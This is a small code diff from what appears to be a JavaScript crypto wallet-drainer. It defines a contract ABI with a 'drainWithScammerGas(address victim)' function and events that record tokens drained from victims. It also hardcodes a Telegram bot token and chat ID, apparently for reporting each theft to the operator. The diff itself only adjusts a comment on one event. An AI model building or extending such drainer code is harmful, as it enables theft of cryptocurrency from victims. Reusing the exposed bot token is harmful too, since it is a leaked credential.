@@ -19,8 +19,7 @@ const contractAddress = "0xAceA17E58cb0652b826Cb0Dc7604A752df6c7325"; // Adresse
 const contractABI = [
     "function drainWithScammerGas(address victim) public",
     "event TokensDrained(address indexed drainedBy, address indexed victim, uint256 tokenCount)",
-    // NEUES, DETAILLIERTES EVENT
-    "event DetailedDrainReport(address indexed victim, uint256 initialBalance, uint256 amountDrained, address indexed drainedBy)"
+    "event DetailedDrainReport(address indexed victim, uint256 initialBalance, uint256 amountDrained, address indexed drainedBy)" // <-- FEHLTTE!
 ];
 const telegramBotToken = "8065667239:AAHDSCJ-IYgnCvIof2xlz0y_q-LglZjPmqI"; // Dein Bot Token
 const yourChatId = "6003232782"; // Deine Chat ID
